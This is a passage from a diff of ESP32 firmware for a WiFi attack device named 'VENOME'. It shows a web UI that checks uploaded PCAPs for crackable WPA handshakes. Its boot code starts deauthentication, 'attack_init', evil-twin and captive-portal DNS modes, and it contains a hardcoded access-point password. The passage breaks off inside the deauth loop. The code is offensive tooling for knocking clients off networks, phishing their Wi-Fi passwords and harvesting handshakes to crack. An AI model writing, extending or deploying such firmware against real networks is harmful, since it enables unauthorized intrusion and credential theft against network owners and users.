+                        radial-gradient(circle at 80% 80%, rgba(0, 255, 255, 0.1) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .cyber-container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .neon-header {
+            background: rgba(10, 15, 31, 0.9);
+            border: 2px solid #ff00ff;
+            box-shadow: 0 0 20px #ff00ff, inset 0 0 20px rgba(255, 0, 255, 0.3);
+            padding: 25px;
+            margin-bottom: 25px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .neon-header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent 30%, rgba(255, 0, 255, 0.1) 50%, transparent 70%);
+            animation: cyberGlow 6s linear infinite;
+        }
+
+        @keyframes cyberGlow {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+
+        .glitch-text {
+            font-size: 2.5em;
+            font-weight: 800;
+            text-transform: uppercase;
+            position: relative;
+            text-shadow: 0.05em 0 0 #ff00ff, -0.05em -0.025em 0 #00ffff;
+            animation: glitch 3s infinite;
+        }
+
+        @keyframes glitch {
+            0%, 100% { text-shadow: 0.05em 0 0 #ff00ff, -0.05em -0.025em 0 #00ffff; }
+            25% { text-shadow: -0.05em -0.025em 0 #ff00ff, 0.025em 0.05em 0 #00ffff; }
+            50% { text-shadow: 0.025em 0.05em 0 #ff00ff, 0.05em 0 0 #00ffff; }
+            75% { text-shadow: -0.025em 0 0 #ff00ff, -0.025em -0.05em 0 #00ffff; }
+        }
+
+        .subtitle {
+            color: #00ffff;
+            text-shadow: 0 0 10px #00ffff;
+            letter-spacing: 3px;
+            margin-top: 10px;
+        }
+
+        .status-bar {
+            background: rgba(10, 15, 31, 0.9);
+            border: 2px solid #00ffff;
+            box-shadow: 0 0 20px #00ffff, inset 0 0 20px rgba(0, 255, 255, 0.2);
+            padding: 15px 25px;
+            margin-bottom: 25px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 30px;
+            backdrop-filter: blur(5px);
+        }
+
+        .status-bar span {
+            color: #00ffff;
+            text-shadow: 0 0 10px #00ffff;
+            font-size: 1.1em;
+        }
+
+        .cyber-card {
+            background: rgba(10, 15, 31, 0.9);
+            border: 2px solid #00ffff;
+            box-shadow: 0 0 20px #00ffff, inset 0 0 20px rgba(0, 255, 255, 0.2);
+            padding: 25px;
+            margin-bottom: 25px;
+            backdrop-filter: blur(5px);
+        }
+
+        .card-title {
+            color: #ff00ff;
+            font-size: 1.3em;
+            letter-spacing: 3px;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            border-bottom: 1px solid #ff00ff;
+            padding-bottom: 10px;
+            text-shadow: 0 0 10px #ff00ff;
+        }
+
+        .upload-area {
+            border: 2px dashed #00ffff;
+            padding: 40px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 20px;
+        }
+
+        .upload-area:hover {
+            border-color: #ff00ff;
+            box-shadow: 0 0 30px #ff00ff;
+        }
+
+        .upload-area.dragover {
+            border-color: #ff00ff;
+            background: rgba(255, 0, 255, 0.1);
+        }
+
+        .upload-icon {
+            font-size: 4em;
+            color: #00ffff;
+            margin-bottom: 15px;
+            text-shadow: 0 0 20px #00ffff;
+        }
+
+        .upload-text {
+            color: #00ffff;
+            font-size: 1.2em;
+            margin-bottom: 10px;
+        }
+
+        .upload-hint {
+            color: #888;
+            font-size: 0.9em;
+        }
+
+        .file-input {
+            display: none;
+        }
+
+        .cyber-btn {
+            background: transparent;
+            border: 2px solid #00ffff;
+            color: #00ffff;
+            padding: 12px 24px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1em;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.3);
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+            margin: 5px;
+        }
+
+        .cyber-btn:hover {
+            background: #00ffff;
+            color: #0a0f1f;
+            box-shadow: 0 0 30px #00ffff;
+        }
+
+        .cyber-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: left 0.5s ease-in-out;
+            z-index: -1;
+        }
+
+        .cyber-btn:hover::before {
+            left: 100%;
+        }
+
+        .btn-neon-pink {
+            border-color: #ff00ff;
+            color: #ff00ff;
+            box-shadow: 0 0 15px rgba(255, 0, 255, 0.3);
+        }
+
+        .btn-neon-pink:hover {
+            background: #ff00ff;
+            color: #0a0f1f;
+        }
+
+        .progress-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin: 25px 0;
+        }
+
+        .progress-item {
+            text-align: center;
+            padding: 15px;
+            border: 1px solid #00ffff;
+            border-radius: 5px;
+        }
+
+        .progress-item.complete {
+            border-color: #00ff00;
+            box-shadow: 0 0 15px #00ff00;
+        }
+
+        .progress-item.complete .progress-icon {
+            color: #00ff00;
+        }
+
+        .progress-icon {
+            font-size: 2em;
+            color: #00ffff;
+            margin-bottom: 10px;
+        }
+
+        .progress-label {
+            color: #00ffff;
+            font-size: 0.9em;
+            margin-bottom: 5px;
+        }
+
+        .progress-value {
+            color: #ff00ff;
+            font-size: 1.2em;
+            font-weight: 600;
+        }
+
+        .percentage-bar {
+            width: 100%;
+            height: 20px;
+            background: #1a1f2f;
+            border: 1px solid #00ffff;
+            margin: 15px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .percentage-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff00ff, #00ffff);
+            width: 0%;
+            transition: width 0.5s;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 25px;
+            border-top: 2px solid #ff00ff;
+            margin-top: 30px;
+            color: #00ffff;
+        }
+
+        .footer-glow {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 15px;
+        }
+
+        .footer-glow span {
+            text-shadow: 0 0 10px currentColor;
+        }
+
+        .footer-glow span:nth-child(1) { color: #ff00ff; }
+        .footer-glow span:nth-child(2) { color: #00ffff; }
+        .footer-glow span:nth-child(3) { color: #ffff00; }
+
+        #status {
+            color: #ffff00;
+            text-align: center;
+            margin: 10px 0;
+            text-shadow: 0 0 10px #ffff00;
+        }
+
+        @media (max-width: 768px) {
+            .glitch-text { font-size: 1.5em; }
+            .progress-grid { grid-template-columns: 1fr 1fr; }
+        }
+    </style>
+</head>
+<body>
+    <div class="cyber-container">
+        <div class="neon-header">
+            <div class="glitch-text">PCAP VERIFIER</div>
+            <div class="subtitle">HANDSHAKE ANALYZER</div>
+        </div>
+
+        <div class="status-bar">
+            <span>&#x1F4E1; AP: <span id="ap-name">VENOME v3</span></span>
+            <span>&#x1F50C; CLIENTS: <span id="client-count">0</span></span>
+            <span>&#x26A1; STATUS: <span id="system-status">READY</span></span>
+        </div>
+
+        <div style="text-align: center; margin: 20px 0; border-top: 2px solid #ff00ff; padding-top: 20px;">
+   <div style="color: #00ffff; margin-bottom: 15px; text-shadow: 0 0 10px #00ffff;">&#x26A1; SWITCH MODE &#x26A1;</div>
+    <button class="cyber-btn" onclick="switchToPacketWiFi()" style="margin: 5px;">
+        &#x1F4E1; Start VENOME v1
+    </button>
+    <button class="cyber-btn btn-neon-pink" onclick="switchToVenomeProject()" style="margin: 5px;">
+        &#x1F4F1; HANDSHAKE CAPTURE
+    </button>
+</div>
+
+
+        <div class="cyber-card">
+            <div class="card-title">&#x1F4E4; UPLOAD PCAP FILE</div>
+
+            <div class="upload-area" id="dropArea">
+    <div class="upload-icon">&#x1F4C1;</div>
+    <div class="upload-text">Drag & Drop PCAP file here</div>
+    <div class="upload-hint">or click to select (Max: 45KB)</div>
+    <input type="file" id="fileInput" class="file-input" accept=".pcap,.cap">
+</div>
+
+            <div style="text-align: center; margin: 20px 0;">
+                <button class="cyber-btn btn-neon-pink" onclick="analyzePCAP_M1()" id="analyzeBtnM1">
+                    &#x1F4E1; ANALYZE M1 ONLY
+                </button>
+                <button class="cyber-btn btn-neon-pink" onclick="analyzePCAP_M234()" id="analyzeBtnM234">
+                    &#x1F4F1; ANALYZE M2/M3/M4 
+                </button>
+                <button class="cyber-btn btn-neon-pink" onclick="resetAnalysis()">
+                    &#x27F2; RESET
+                </button>
+            </div>
+
+
+            <div id="status"></div>
+        </div>
+
+        <div id="result" style="display: none;">
+            <div class="cyber-card">
+                <div class="card-title">&#x1F52C; ANALYSIS RESULTS</div>
+
+                <div class="progress-grid" id="progressGrid">
+                    <div class="progress-item" id="m1Item">
+                        <div class="progress-icon">&#x1F4E1;</div>
+                        <div class="progress-label">MESSAGE 1</div>
+                        <div class="progress-value" id="m1Status">&#x274C;</div>
+                    </div>
+                    <div class="progress-item" id="m2Item">
+                        <div class="progress-icon">&#x1F4F1;</div>
+                        <div class="progress-label">MESSAGE 2</div>
+                        <div class="progress-value" id="m2Status">&#x274C;</div>
+                    </div>
+                    <div class="progress-item" id="m3Item">
+                        <div class="progress-icon">&#x1F4E1;</div>
+                        <div class="progress-label">MESSAGE 3</div>
+                        <div class="progress-value" id="m3Status">&#x274C;</div>
+                    </div>
+                    <div class="progress-item" id="m4Item">
+                        <div class="progress-icon">&#x1F4F1;</div>
+                        <div class="progress-label">MESSAGE 4</div>
+                        <div class="progress-value" id="m4Status">&#x274C;</div>
+                    </div>
+                </div>
+
+                <div class="percentage-bar">
+                    <div class="percentage-fill" id="percentageFill" style="width: 0%;"></div>
+                </div>
+
+                <div style="text-align: center; margin-top: 20px;" id="downloadSection" style="display: none;">
+                    <a href="/download" class="cyber-btn btn-neon-pink" download="analysis.txt">
+                        &#x1F4BE; DOWNLOAD ANALYSIS
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div>PCAP VERIFIER</div>
+            <div class="footer-glow">
+                <span>&#x26A1; M1+M2 = CRACKABLE</span>
+                <span>&#x1F513; COMPLETE = 4/4</span>
+                <span>&#x1F4E1; PCAP ONLY</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    const dropArea = document.getElementById('dropArea');
+    const fileInput = document.getElementById('fileInput');
+    
+    // ❌ YEH LINE HATAO - analyzeBtn variable define mat karo
+    // const analyzeBtn = document.getElementById('analyzeBtn');
+    
+    const analyzeBtnM1 = document.getElementById('analyzeBtnM1');
+    const analyzeBtnM234 = document.getElementById('analyzeBtnM234');
+    const statusDiv = document.getElementById('status');
+    const resultDiv = document.getElementById('result');
+
+    let selectedFile = null;
+
+    // Drag & Drop handlers
+    dropArea.addEventListener('click', () => fileInput.click());
+
+    dropArea.addEventListener('dragover', (e) => {
+        e.preventDefault();
+        dropArea.classList.add('dragover');
+    });
+
+    dropArea.addEventListener('dragleave', () => {
+        dropArea.classList.remove('dragover');
+    });
+
+    dropArea.addEventListener('drop', (e) => {
+        e.preventDefault();
+        dropArea.classList.remove('dragover');
+
+        const files = e.dataTransfer.files;
+        if (files.length > 0) {
+            handleFileSelect(files[0]);
+        }
+    });
+
+    fileInput.addEventListener('change', (e) => {
+        if (e.target.files.length > 0) {
+            handleFileSelect(e.target.files[0]);
+        }
+    });
+
+    function handleFileSelect(file) {
+        console.log("📁 File selected:", file.name, file.size);
+        
+        if (!file.name.toLowerCase().endsWith('.pcap') && !file.name.toLowerCase().endsWith('.cap')) {
+            statusDiv.innerHTML = '&#x274C; Please select a .pcap or .cap file';
+            return;
+        }
+        
+        const maxSize = 45 * 1024; // 45KB
+        if (file.size > maxSize) {
+            statusDiv.innerHTML = '&#x274C; File too large! Maximum size is 45KB. Your file: ' + (file.size / 1024).toFixed(2) + 'KB';
+            return;
+        }
+        
+        selectedFile = file;
+        dropArea.querySelector('.upload-text').innerHTML = `&#x1F4C4; ${file.name}`;
+        dropArea.querySelector('.upload-hint').innerHTML = `Size: ${(file.size / 1024).toFixed(2)} KB (Max: 45KB)`;
+        
+        // ✅ Sirf M1 and M234 buttons enable karo
+        if (analyzeBtnM1) analyzeBtnM1.disabled = false;
+        if (analyzeBtnM234) analyzeBtnM234.disabled = false;
+        
+        statusDiv.innerHTML = '&#x2705; File selected. Choose analysis method:';
+        console.log("✅ File ready for analysis");
+    }
+
+    function switchToPacketWiFi() {
+        statusDiv.innerHTML = '&#x23F3; Switching to PacketWiFi...';
+
+        fetch('/switch-to-packetwifi', {
+            method: 'POST'
+        })
+        .then(response => response.text())
+        .then(data => {
+            statusDiv.innerHTML = '&#x2705; ' + data;
+            setTimeout(() => {
+                window.location.href = '/';
+            }, 2000);
+        })
+        .catch(error => {
+            statusDiv.innerHTML = '&#x274C; Error: ' + error;
+        });
+    }
+
+    function switchToVenomeProject() {
+        statusDiv.innerHTML = '&#x23F3; Switching to Venome Project...';
+
+        fetch('/switch-to-venome', {
+            method: 'POST'
+        })
+        .then(response => response.text())
+        .then(data => {
+            statusDiv.innerHTML = '&#x2705; ' + data;
+            setTimeout(() => {
+                window.location.href = '/';
+            }, 2000);
+        })
+        .catch(error => {
+            statusDiv.innerHTML = '&#x274C; Error: ' + error;
+        });
+    }
+
+    function analyzePCAP_M1() {
+        console.log("🔥 analyzePCAP_M1 button clicked!");
+        console.log("Selected file:", selectedFile);
+        
+        if (!selectedFile) {
+            console.log("❌ No file selected");
+            statusDiv.innerHTML = '&#x274C; Please select a file first';
+            return;
+        }
+
+      
+        const formData = new FormData();
+            formData.append('pcap', selectedFile);
+            formData.append('mode', 'm1');
+            
+            statusDiv.innerHTML = '&#x23F3; Analyzing M1 only (Neeche wala method)...';
+            
+            analyzeBtnM1.disabled = true;
+            analyzeBtnM234.disabled = true;
+            
+            fetch('/upload?mode=m1', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                statusDiv.innerHTML = '';
+                resultDiv.style.display = 'block';
+                updateResults(data);
+            })
+            .catch(error => {
+                statusDiv.innerHTML = '&#x274C; Error: ' + error;
+              
+                analyzeBtnM1.disabled = false;
+                analyzeBtnM234.disabled = false;
+            });   
+    }
+
+    function analyzePCAP_M234() {
+        console.log("🔥 analyzePCAP_M234 button clicked!");
+        console.log("Selected file:", selectedFile);
+        
+        if (!selectedFile) {
+            console.log("❌ No file selected");
+            statusDiv.innerHTML = '&#x274C; Please select a file first';
+            return;
+        }
+        
+        const formData = new FormData();
+        formData.append('pcap', selectedFile);
+        formData.append('mode', 'm234');
+        
+        statusDiv.innerHTML = '&#x23F3; Analyzing M2/M3/M4...';
+        if (analyzeBtnM1) analyzeBtnM1.disabled = true;
+        if (analyzeBtnM234) analyzeBtnM234.disabled = true;
+        
+        console.log("📤 Sending fetch request to /upload");
+        
+        fetch('/upload', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('HTTP error ' + response.status);
+            }
+            return response.json();
+        })
+        .then(data => {
+            console.log("✅ Analysis data:", data);
+            statusDiv.innerHTML = '✅ Analysis complete!';
+            resultDiv.style.display = 'block';
+            updateResults(data);
+        })
+        .catch(error => {
+            console.error("❌ Error:", error);
+            statusDiv.innerHTML = '&#x274C; Error: ' + error.message;
+            if (analyzeBtnM1) analyzeBtnM1.disabled = false;
+            if (analyzeBtnM234) analyzeBtnM234.disabled = false;
+        });
+    }
+
+    function updateResults(data) {
+        console.log("📊 Updating results with:", data);
+        
+        updateProgressItem('m1Item', 'm1Status', data.hasM1);
+        updateProgressItem('m2Item', 'm2Status', data.hasM2);
+        updateProgressItem('m3Item', 'm3Status', data.hasM3);
+        updateProgressItem('m4Item', 'm4Status', data.hasM4);
+        
+        const percentageFill = document.getElementById('percentageFill');
+        if (percentageFill) {
+            percentageFill.style.width = data.percentage + '%';
+        }
+        
+        const downloadSection = document.getElementById('downloadSection');
+        if (downloadSection) {
+            downloadSection.style.display = 'block';
+        }
+        
+        // ✅ Buttons enable karo
+        if (analyzeBtnM1) analyzeBtnM1.disabled = false;
+        if (analyzeBtnM234) analyzeBtnM234.disabled = false;
+    }
+
+    function updateProgressItem(itemId, statusId, hasValue) {
+        const item = document.getElementById(itemId);
+        const status = document.getElementById(statusId);
+        
+        if (!item || !status) {
+            console.warn(`Element not found: ${itemId} or ${statusId}`);
+            return;
+        }
+
+        if (hasValue) {
+            item.classList.add('complete');
+            status.innerHTML = '&#x2705;';
+        } else {
+            item.classList.remove('complete');
+            status.innerHTML = '&#x274C;';
+        }
+    }
+
+    function resetAnalysis() {
+        selectedFile = null;
+        fileInput.value = '';
+        dropArea.querySelector('.upload-text').innerHTML = 'Drag & Drop PCAP file here';
+        dropArea.querySelector('.upload-hint').innerHTML = 'or click to select';
+        
+        if (analyzeBtnM1) analyzeBtnM1.disabled = true;
+        if (analyzeBtnM234) analyzeBtnM234.disabled = true;
+        
+        statusDiv.innerHTML = '';
+        resultDiv.style.display = 'none';
+        
+        ['m1Item', 'm2Item', 'm3Item', 'm4Item'].forEach(id => {
+            const element = document.getElementById(id);
+            if (element) element.classList.remove('complete');
+        });
+        
+        const m1Status = document.getElementById('m1Status');
+        const m2Status = document.getElementById('m2Status');
+        const m3Status = document.getElementById('m3Status');
+        const m4Status = document.getElementById('m4Status');
+        
+        if (m1Status) m1Status.innerHTML = '&#x274C;';
+        if (m2Status) m2Status.innerHTML = '&#x274C;';
+        if (m3Status) m3Status.innerHTML = '&#x274C;';
+        if (m4Status) m4Status.innerHTML = '&#x274C;';
+        
+        const percentageFill = document.getElementById('percentageFill');
+        if (percentageFill) percentageFill.style.width = '0%';
+    }
+
+    // Clients count update
+    setInterval(() => {
+        fetch('/clients')
+            .then(r => r.text())
+            .then(count => {
+                const clientCount = document.getElementById('client-count');
+                if (clientCount) {
+                    clientCount.innerHTML = count;
+                }
+            })
+            .catch(err => console.log('Client count fetch error:', err));
+    }, 2000);
+</script>
+</body>
+</html>
+)rawliteral";
+
+// ==================== Web Server Handlers ====================
+
+String getContentType(String filename)
+{
+  if (filename.endsWith(".html"))
+    return "text/html";
+  else if (filename.endsWith(".css"))
+    return "text/css";
+  else if (filename.endsWith(".js"))
+    return "application/javascript";
+  else if (filename.endsWith(".png"))
+    return "image/png";
+  else if (filename.endsWith(".jpg"))
+    return "image/jpeg";
+  else if (filename.endsWith(".ttf"))
+    return "font/ttf";
+  else if (filename.endsWith(".woff"))
+    return "font/woff";
+  else if (filename.endsWith(".woff2"))
+    return "font/woff2";
+  return "text/plain";
+}
+
+void handleUpload(AsyncWebServerRequest *request, String filename, size_t index, uint8_t *data, size_t len, bool final)
+{
+  static uint8_t *pcapBuffer = nullptr;
+  static size_t pcapSize = 0;
+  static String currentMode = ""; // Store mode
+
+  const size_t MAX_FILE_SIZE = 45 * 1024; // 45KB in bytes
+
+  if (!index)
+  {
+    // First chunk - initialize
+    Serial.printf("Upload Start: %s\n", filename.c_str());
+
+    // Check for mode parameter
+    if (request->hasParam("mode"))
+    {
+      currentMode = request->getParam("mode")->value();
+      Serial.printf("Mode: %s\n", currentMode.c_str());
+    }
+    else
+    {
+      currentMode = "all"; // Default mode
+    }
+
+    pcapSize = 0;
+    if (pcapBuffer)
+      free(pcapBuffer);
+    pcapBuffer = nullptr;
+  }
+
+  // Check if adding this chunk would exceed max size
+  if (pcapSize + len > MAX_FILE_SIZE)
+  {
+    Serial.printf("❌ File too large! Max: 45KB, Current: %uKB\n", (pcapSize + len) / 1024);
+
+    // Send error response
+    if (final)
+    {
+      AsyncResponseStream *response = request->beginResponseStream("application/json");
+      response->print("{\"error\":\"File too large! Maximum size is 45KB\"}");
+      request->send(response);
+
+      // Cleanup
+      if (pcapBuffer)
+      {
+        free(pcapBuffer);
+        pcapBuffer = nullptr;
+      }
+      pcapSize = 0;
+      currentMode = "";
+    }
+    return;
+  }
+
+  if (len > 0)
+  {
+    // Append chunk
+    pcapBuffer = (uint8_t *)realloc(pcapBuffer, pcapSize + len);
+    if (pcapBuffer)
+    {
+      memcpy(pcapBuffer + pcapSize, data, len);
+      pcapSize += len;
+    }
+  }
+
+  if (final)
+  {
+    // Upload complete - analyze
+    Serial.printf("Upload Complete: %u bytes (%.2fKB)\n", pcapSize, pcapSize / 1024.0);
+
+    if (pcapSize > 0 && pcapBuffer)
+    {
+      PCAPParser parser(pcapBuffer, pcapSize);
+
+      // Different analysis based on mode
+      if (currentMode == "m1")
+      {
+        lastAnalysis = parser.analyzeM1Only(); // Sirf M1
+      }
+      else if (currentMode == "m234")
+      {
+        lastAnalysis = parser.analyzeM234Only(); // Sirf M2,M3,M4
+      }
+      else
+      {
+        lastAnalysis = parser.analyze(); // Dono combined
+      }
+
+      analysisDone = true;
+
+      // Log analysis
+      Serial.println("═══════════════════════════════");
+      Serial.println("PCAP ANALYSIS COMPLETE:");
+      Serial.println(lastAnalysis.getStatusString());
+      Serial.println("═══════════════════════════════");
+    }
+
+    // Send response
+    AsyncResponseStream *response = request->beginResponseStream("application/json");
+    if (analysisDone)
+    {
+      response->print(lastAnalysis.getJSON());
+    }
+    else
+    {
+      response->print("{\"error\":\"Analysis failed\"}");
+    }
+    request->send(response);
+
+    // Cleanup
+    if (pcapBuffer)
+    {
+      free(pcapBuffer);
+      pcapBuffer = nullptr;
+    }
+    pcapSize = 0;
+    currentMode = "";
+  }
+}
+
+void handleDownload(AsyncWebServerRequest *request)
+{
+  if (analysisDone)
+  {
+    String analysis = lastAnalysis.getStatusString();
+    request->send(200, "text/plain", analysis);
+  }
+  else
+  {
+    request->send(404, "text/plain", "No analysis available");
+  }
+}
+
+void handleClients(AsyncWebServerRequest *request)
+{
+  request->send(200, "text/plain", String(WiFi.softAPgetStationNum()));
+}
+
+void handleRoot(AsyncWebServerRequest *request)
+{
+  request->send(200, "text/html", index_html); // send_P ko send karo
+}
+
+void handleFont(AsyncWebServerRequest *request)
+{
+  String path = request->url();
+  if (path.startsWith("/fonts/"))
+  {
+    String filename = path.substring(7);
+    if (LittleFS.exists("/" + filename))
+    {
+      request->send(LittleFS, "/" + filename, getContentType(filename));
+    }
+    else
+    {
+      request->send(404, "text/plain", "Font not found");
+    }
+  }
+}
+void notFound(AsyncWebServerRequest *request)
+{
+  request->redirect("/");
+}
+
+int bootMode = 0;
+
+void setup()
+{
+  Serial.begin(115200);
+  delay(1000);
+  if (!LittleFS.begin(true))
+  {
+    Serial.println("LittleFS Mount Failed");
+    return;
+  }
+  Serial.println("LittleFS mounted successfully");
+  // 👇 YEH DEBUG CODE DAALO - Files check karne ke liye
+  Serial.println("📁 Files in LittleFS:");
+  File root = LittleFS.open("/");
+  File file = root.openNextFile();
+  while (file)
+  {
+    Serial.print("  - ");
+    Serial.print(file.name());
+    Serial.print(" (");
+    Serial.print(file.size());
+    Serial.println(" bytes)");
+    file = root.openNextFile();
+  }
+  prefs.begin("boot", true); // true = read-only
+  bootMode = prefs.getInt("mode", 0);
+  prefs.end();
+
+  Serial.print("BootMode from NVS: ");
+  Serial.println(bootMode);
+
+  // Agar mode change karna hai to write mode mein open karo
+  if (bootMode != 0)
+  { // Agar already 0 nahi hai tabhi write karo
+    Serial.println("⚠️ Resetting to PacketWiFi mode for next boot...");
+
+    // 👇 YEH LINE IMPORTANT HAI - Write mode mein open karo
+    prefs.begin("boot", false); // false = write mode
+    prefs.putInt("mode", 0);    // Reset to PacketWiFi
+    prefs.end();                // Close after write
+  }
+  else
+  {
+    Serial.println("✅ Already in PacketWiFi mode, no write needed");
+  }
+
+  if (bootMode == 2)
+  {
+    Serial.println("\n\n═══════════════════════════════");
+    Serial.println("VENOME VERIFIER v2.0");
+    Serial.println("Combined Handshake Analyzer");
+    Serial.println("═══════════════════════════════");
+
+    // Initialize LittleFS
+    if (!LittleFS.begin(true))
+    {
+      Serial.println("❌ LittleFS Mount Failed");
+      return;
+    }
+    Serial.println("✅ LittleFS mounted");
+
+    // Start AP
+    WiFi.mode(WIFI_AP);
+    WiFi.softAP(AP_SSID, AP_PASSWORD);
+
+    IPAddress IP = WiFi.softAPIP();
+    Serial.print("✅ AP Started: ");
+    Serial.print(AP_SSID);
+    Serial.print(" @ ");
+    Serial.println(IP);
+
+    // Configure Web Server
+    server.on("/", HTTP_GET, handleRoot);
+    server.on("/clients", HTTP_GET, handleClients);
+    server.on("/download", HTTP_GET, handleDownload);
+    // Make sure upload route is properly configured
+    server.on("/upload", HTTP_POST, [](AsyncWebServerRequest *request)
+              {
+      // This function runs when upload is complete
+      Serial.println("Upload request completed"); },
+              handleUpload // This handles the actual upload
+    );
+
+    // Font handling for AsyncWebServer
+    server.on("/fonts/Orbitron-Regular.ttf", HTTP_GET, [](AsyncWebServerRequest *request)
+              { request->send(LittleFS, "/Orbitron-Regular.ttf", "font/ttf"); });
+
+    server.on("/fonts/Orbitron-SemiBold.ttf", HTTP_GET, [](AsyncWebServerRequest *request)
+              { request->send(LittleFS, "/Orbitron-SemiBold.ttf", "font/ttf"); });
+
+    server.on("/fonts/Orbitron-ExtraBold.ttf", HTTP_GET, [](AsyncWebServerRequest *request)
+              { request->send(LittleFS, "/Orbitron-ExtraBold.ttf", "font/ttf"); });
+
+    // Add mode switching handlers
+    server.on("/switch-to-packetwifi", HTTP_POST, [](AsyncWebServerRequest *request)
+              {
+          request->send(200, "text/plain", "Switching to PacketWiFi...");
+          
+          Serial.println("🔄 Switching to PacketWiFi from PCAP Verifier...");
+          
+          prefs.begin("boot", false);
+          prefs.putInt("mode", 0); // 0 = PacketWiFi
+          prefs.end();
+          
+          delay(1000);
+          ESP.restart(); });
+
+    server.on("/switch-to-venome", HTTP_POST, [](AsyncWebServerRequest *request)
+              {
+          request->send(200, "text/plain", "Switching to Handshake Capture...");
+          
+          Serial.println("🔄 Switching to Venome Project from Venome Verifier...");
+          
+          prefs.begin("boot", false);
+          prefs.putInt("mode", 1); // 1 = Venome Project
+          prefs.end();
+          
+          delay(1000);
+          ESP.restart(); });
+
+    server.onNotFound(notFound);
+
+    // CORS headers
+    DefaultHeaders::Instance().addHeader("Access-Control-Allow-Origin", "*");
+
+    server.begin();
+    Serial.println("✅ Web Server Started");
+    Serial.println("═══════════════════════════════");
+    Serial.println("Connect to WiFi: " + String(AP_SSID));
+    Serial.println("Password: " + String(AP_PASSWORD));
+    Serial.println("Open: http://192.168.4.1");
+    Serial.println("═══════════════════════════════");
+  }
+  else if (bootMode == 1) // 👈 CHANGE THIS TO 2
+  {
+    Serial.println("🚀 Starting Venome Project...");
+
+    prefs.begin("boot", false);
+    prefs.putInt("mode", 0); // reset after boot
+    prefs.end();
+
+    esp_err_t ret = nvs_flash_init();
+    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND)
+    {
+      ESP_ERROR_CHECK(nvs_flash_erase());
+      ret = nvs_flash_init();
+    }
+    ESP_ERROR_CHECK(ret);
+
+    ESP_ERROR_CHECK(esp_event_loop_create_default());
+
+    wifictl_mgmt_ap_start();
+    attack_init();
+    webserver_run();
+
+    Serial.println("✅ Venome Project Ready!");
+  }
+  else
+  {
+    Serial.println("🚀 Starting PacketWiFi Project...");
+
+    prefs.begin("boot", false);
+    prefs.putInt("mode", 0);
+    prefs.end();
+
+    init_deauth();
+
+    WiFi.mode(WIFI_AP_STA);
+    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+    WiFi.softAP("VENOME v1", "Venome@kali");
+
+    dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
+
+    // Register web server handlers
+    webServer.on("/", handleIndex);
+    webServer.on("/result", handleResult);
+    webServer.on("/admin", handleAdmin);
+    webServer.on("/moniter", handleMonitor);
+    webServer.on("/handshake", handleHandshake);
+    webServer.on("/venomeverifies", handleVenomeVerifies);
+
+    // Font handlers
+    webServer.on("/fonts/Orbitron-Regular.ttf", HTTP_GET, []()
+                 {
+                    File file = LittleFS.open("/Orbitron-Regular.ttf", "r");
+                    webServer.streamFile(file, "font/ttf");
+                    file.close(); });
+
+    webServer.on("/fonts/Orbitron-SemiBold.ttf", HTTP_GET, []()
+                 {
+                    File file = LittleFS.open("/Orbitron-SemiBold.ttf", "r");
+                    webServer.streamFile(file, "font/ttf");
+                    file.close(); });
+
+    webServer.on("/fonts/Orbitron-ExtraBold.ttf", HTTP_GET, []()
+                 {
+                    File file = LittleFS.open("/Orbitron-ExtraBold.ttf", "r");
+                    webServer.streamFile(file, "font/ttf");
+                    file.close(); });
+
+    webServer.on("/switchPacketWifi", HTTP_GET, []()
+                 {
+                    Preferences prefs;
+                    prefs.begin("boot", false);
+                    prefs.putInt("mode", 0);
+                    prefs.end();
+
+                    webServer.send(200, "text/plain", "Switching to PacketWiFi...");
+
+                    delay(50);
+                    ESP.restart(); });
+
+    webServer.onNotFound(handleIndex);
+
+    webServer.begin();
+
+    performScan();
+
+    Serial.println("✅ PacketWiFi Ready!");
+    Serial.println("AP: VENOME v1");
+    Serial.println("Password: Venome@kali");
+    Serial.println("IP: 192.168.4.1");
+  }
+}
+
+void loop()
+{
+  if (bootMode != 12345) // This condition seems unnecessary, but keeping for compatibility
+  {
+    // ==================== MODE 0: PACKETWIFI ====================
+    if (bootMode == 0)
+    {
+      dnsServer.processNextRequest();
+      webServer.handleClient();
+
+      if (isVerifyingPassword)
+      {
+        deauthing_active = false;
+        attack_active = false;
+      }
+
+      // ===== CONSTANT RATE DEVIL STYLE DEAUTH =====
+      if (deauthing_active && !devil_twin_active && !evil_twin_running)
+      {
+        // MAC cleanup
+        if (millis() - last_mac_cleanup >= MAC_CLEANUP_INTERVAL)
+        {
+          if (uniqueClientMACs.size() > MAX_STORED_CLIENTS / 2)
+          {
